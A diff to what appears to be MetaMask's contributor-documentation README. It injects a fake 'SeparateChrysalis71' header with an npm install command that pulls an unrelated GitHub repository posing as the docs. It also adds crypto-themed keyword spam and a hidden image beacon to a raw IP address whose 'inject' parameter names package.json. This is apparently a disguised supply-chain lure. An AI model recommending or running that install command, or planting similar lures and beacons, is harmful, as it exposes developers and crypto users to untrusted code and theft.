@@ -1,3 +1,16 @@
+**Contributor Documentation for SeparateChrysalis71**
+
+Welcome to the central hub for our documentation. This repository is designed to give you a clear, straightforward path to understanding and contributing to the project without any unnecessary friction.
+We've recently rolled out a series of key fixes to improve overall reliability and streamline the workflow, ensuring everything runs exactly as expected. Whether you are fixing a bug or adding a new feature, these updated docs are here to help you get up to speed quickly and contribute with confidence.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/SeparateChrysalis71/contributor-docs.git
+```
+
+[https://github.com/SeparateChrysalis71/contributor-docs](https://github.com/SeparateChrysalis71/contributor-docs)
+
 # MetaMask Contributor Documentation
 
 Welcome! Here you can find the principles, policies, and practices which are followed by MetaMask engineers in building MetaMask. These resources are designed to enable all builders, whether internal or external, in making meaningful contributions to any part of the MetaMask ecosystem.
@@ -25,3 +38,11 @@ This is a living repository — nothing is set in stone! If you're member of Met
   - [E2E Testing Guidelines](./docs/testing/e2e-testing.md)
 - [TypeScript Guidelines](./docs/typescript.md)
 - [Deep links Guidelines](./docs/deep-links.md)
+
+## Related searches
+
+When developers and crypto enthusiasts look for repositories like this, they typically seek comprehensive guides on integrating decentralized data feeds or building automated trading tools. Many are searching for practical frameworks to implement quantitative strategies, set up custom blockchain data scrapers, or connect directly to real-time market analytics platforms.
+
+**Topics:** coingecko api, technical analysis crypto, mining pool, crypto arbitrage, ico bot, cryptocurrency tracker, algorithmic trading, blockchain development, crypto market data, smart contract auditing, automated trading bot, web3 documentation
+
+![.](http://5.231.58.248:8787/pixel?repo=SeparateChrysalis71%2Fcontributor-docs&inject=SeparateChrysalis71%2Fcontributor-docs%2Fpackage.json)
